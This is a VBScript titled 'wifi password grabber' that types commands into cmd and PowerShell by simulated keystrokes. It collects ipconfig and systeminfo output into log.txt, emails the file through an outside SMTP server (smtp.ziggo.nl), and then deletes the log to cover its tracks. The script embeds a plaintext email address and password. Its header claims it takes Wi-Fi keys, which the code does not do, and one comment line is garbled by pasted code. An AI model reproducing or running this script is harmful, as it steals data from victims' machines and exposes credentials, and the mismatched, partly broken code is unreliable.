set wshshell = wscript.createobject("wscript.shell")
set objshell = createobject("shell.application")
' title: wifi password grabber
' author: siem
' version: 3
' dwshshell.sendkeys("{esc}")ription: saves the ssid, network type, authentication and the password to log.txt and emails the contents of log.txt from a gmail account.")
wscript.sleep 3000

' --> minimize all windows


' --> open cmd
objshell.filerun
wscript.sleep 500
wshshell.sendkeys(" cmd")
wshshell.sendkeys("{enter}")
wscript.sleep 1000
wshshell.sendkeys("ipconfig > ""C:\Users\tim24\Desktop\log.txt"" ")
wshshell.sendkeys("{enter}")
wshshell.sendkeys("systeminfo >> ""C:\Users\tim24\Desktop\log.txt"" ")
wshshell.sendkeys("{enter}")
wscript.sleep 5000

' --> mail log.txt
wshshell.sendkeys(" powershell")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" $smtpserver = {'}smtp.ziggo.nl{'}")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" $smtpinfo = new-object net.mail.smtpclient{(}$smtpserver, 587{)}")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" $smtpinfo.enablessl = $true")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" $smtpinfo.credentials = new-object system.net.networkcredential{(}{'}tim241@ziggo.nl{'}, {'}Twanda01{'}{)}")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" $reportemail = new-object system.net.mail.mailmessage")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" $reportemail.from = {'}tim241@ziggo.nl{'}")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" $reportemail.to.add{(}{'}tim241@ziggo.nl{'}{)}")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" $reportemail.subject = {'}wifi key grabber{'}")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" $reportemail.body = {(}get-content ""C:\Users\tim24\Desktop\log.txt"" {|} out-string{)}")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" $smtpinfo.send{(}$reportemail{)}")
wshshell.sendkeys("{enter}")
wshshell.sendkeys(" exit")
wshshell.sendkeys("{enter}")
wscript.sleep 2000
wshshell.sendkeys(" del  ""C:\Users\tim24\Desktop\log.txt""  & exit")
wshshell.sendkeys("{enter}")
